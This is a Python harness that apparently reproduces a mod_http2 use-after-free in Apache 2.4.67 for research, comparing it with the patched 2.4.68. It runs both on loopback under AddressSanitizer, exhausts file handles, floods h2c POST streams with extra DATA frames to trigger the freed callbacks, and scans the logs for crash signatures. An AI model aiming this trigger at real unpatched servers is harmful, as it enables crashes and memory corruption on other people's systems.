#!/usr/bin/env python3
"""Adjacent lane L8: CVE-2026-48913 mod_http2 UAF when file handles exhausted.

2.4.67 mod_http2 registers c2/stream callbacks on stream->input BEFORE creating
the per-stream input pipe (h2_mplx.c:883-891). If apr_file_pipe_create_pools()
fails (EMFILE), s_next_c2() destroys c2 while those callbacks still point at
it -> use-after-free when the input beam later runs them. 2.4.68 moves the
registrations after successful pipe creation.

This harness runs each ASan build on loopback with a deliberately low
RLIMIT_NOFILE and drives many concurrent h2c POST-with-body requests so the
per-stream pipe creation hits EMFILE. No off-loopback traffic.
"""
import os
import re
import resource
import signal
import subprocess
import sys
import threading
import time

from h2client import H2Connection, ConnectionClosed, ProtocolError, default_headers

HERE = os.path.dirname(__file__)
BASE = HERE
LOGS = os.path.join(HERE, "logs")
RUN = os.path.join(BASE, "l8", "run")
DOCROOT = os.path.join(HERE, os.pardir, "frontier", "apache2root", "htdocs")
for d in (LOGS, RUN):
    os.makedirs(d, exist_ok=True)

NOFILE = int(os.environ.get("L8_NOFILE", "48"))
CONNS = int(os.environ.get("L8_CONNS", "8"))
STREAMS = int(os.environ.get("L8_STREAMS", "60"))
BODY = b"X" * 64

SIGS = ("heap-use-after-free", "double-free", "Attempting free on address",
        "AddressSanitizer", "SEGV", "create input write pipe",
        "APR_STATUS_IS_EMFILE", "Too many open files", "EMFILE")


def conf_for(version, port):
    root = os.path.join(BASE, "l2" if version == "2.4.67" else "l3",
                        "install-%s-asan" % version)
    return """ServerRoot "{root}"
PidFile "{pid}"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule http2_module modules/mod_http2.so
ServerName localhost
ErrorLog "{err}"
LogLevel info
Protocols h2c http/1.1
H2Direct on
H2MaxSessionStreams 200
DocumentRoot "{docroot}"
<Directory "{docroot}">
    Require all granted
</Directory>
""".format(root=root, pid=os.path.join(RUN, "l8-%s.pid" % version),
           port=port, err=os.path.join(LOGS, "l8-%s-error.log" % version),
           docroot=DOCROOT)


def stop(pidfile):
    if not os.path.exists(pidfile):
        return
    with open(pidfile) as f:
        for line in f:
            try:
                pid = int(line.strip())
            except ValueError:
                continue
            try:
                os.kill(pid, signal.SIGTERM)
            except ProcessLookupError:
                pass
    for _ in range(30):
        if not os.path.exists(pidfile):
            return
        time.sleep(0.1)
    try:
        os.unlink(pidfile)
    except FileNotFoundError:
        pass


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.requests = 0
        self.responses = 0
        self.errors = 0
        self.closed = 0

    def bump(self, field, n=1):
        with self.lock:
            setattr(self, field, getattr(self, field) + n)


def hammer(port, deadline, stats):
    try:
        conn = H2Connection("127.0.0.1", port, timeout=5.0)
        conn.handshake()
    except (OSError, ProtocolError, ConnectionClosed):
        stats.bump("errors")
        return
    sid = 1
    rounds = int(os.environ.get("L8_DATA_ROUNDS", "1"))
    try:
        while time.time() < deadline:
            live = []
            for _ in range(STREAMS):
                if time.time() >= deadline:
                    break
                try:
                    hdrs = default_headers(method="POST",
                                           extra=[("content-type",
                                                   "application/octet-stream")])
                    conn.send_request_headers(sid, hdrs, end_stream=False)
                    conn.send_data(sid, BODY, end_stream=(rounds <= 1))
                    if rounds > 1:
                        live.append(sid)
                except (OSError, ConnectionClosed):
                    stats.bump("closed")
                    return
                sid += 2
                stats.bump("requests")
            # Continue feeding DATA on open input beams. If pipe creation
            # failed above, 2.4.67 left c2/stream callbacks registered on the
            # beam and then freed c2; these writes drive the stale callbacks.
            for r in range(1, rounds):
                if time.time() >= deadline:
                    break
                time.sleep(0.01)
                for s in live:
                    try:
                        conn.send_data(s, BODY, end_stream=(r == rounds - 1))
                    except (OSError, ConnectionClosed):
                        stats.bump("closed")
                        break
            conn.sock.settimeout(0.1)
            try:
                for _ in range(STREAMS * 2):
                    conn.read_frame()
                    stats.bump("responses")
            except (OSError, ConnectionClosed):
                stats.bump("closed")
                return
    finally:
        conn.close()


def probe(version, port, duration):
    conf = os.path.join(RUN, "l8-%s.conf" % version)
    err = os.path.join(LOGS, "l8-%s-error.log" % version)
    srvout = os.path.join(LOGS, "l8-%s-srvout.log" % version)
    with open(conf, "w") as f:
        f.write(conf_for(version, port))
    for p in (err, srvout):
        if os.path.exists(p):
            os.unlink(p)
    stop(os.path.join(RUN, "l8-%s.pid" % version))
    httpd = os.path.join(BASE, "l2" if version == "2.4.67" else "l3",
                         "install-%s-asan" % version, "bin", "httpd")
    def limits():
        resource.setrlimit(resource.RLIMIT_NOFILE, (NOFILE, NOFILE))
    out = open(srvout, "wb")
    srv = subprocess.Popen([httpd, "-f", conf], stdout=out,
                           stderr=subprocess.STDOUT, preexec_fn=limits)
    time.sleep(1.5)
    stats = Stats()
    deadline = time.time() + duration
    threads = []
    for _ in range(CONNS):
        t = threading.Thread(target=hammer, args=(port, deadline, stats),
                             daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=duration + 15)
    stop(os.path.join(RUN, "l8-%s.pid" % version))
    try:
        srv.wait(timeout=10)
    except subprocess.TimeoutExpired:
        srv.kill()
        srv.wait()
    out.close()
    log = ""
    if os.path.exists(err):
        with open(err, errors="replace") as f:
            log = f.read()
    counts = {s: len(re.findall(re.escape(s), log, re.I)) for s in SIGS}
    return dict(version=version, port=port, srv_rc=srv.returncode,
                requests=stats.requests, responses=stats.responses,
                errors=stats.errors, closed=stats.closed,
                signatures=counts, log_bytes=len(log), log_tail=log[-3000:])


def main():
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 15.0
    print("L8 NOFILE=%d CONNS=%d STREAMS=%d duration=%.0f" %
          (NOFILE, CONNS, STREAMS, duration), flush=True)
    for version, port in (("2.4.67", 7268), ("2.4.68", 7269)):
        r = probe(version, port, duration)
        print("=== %s port %d ===" % (version, port), flush=True)
        print("srv_rc=%s sent=%d resp=%d err=%d closed=%d sigs=%s log_bytes=%d" %
              (r["srv_rc"], r["requests"], r["responses"], r["errors"],
               r["closed"], r["signatures"], r["log_bytes"]), flush=True)
        print("LOG TAIL:\n" + r["log_tail"], flush=True)


if __name__ == "__main__":
    main()
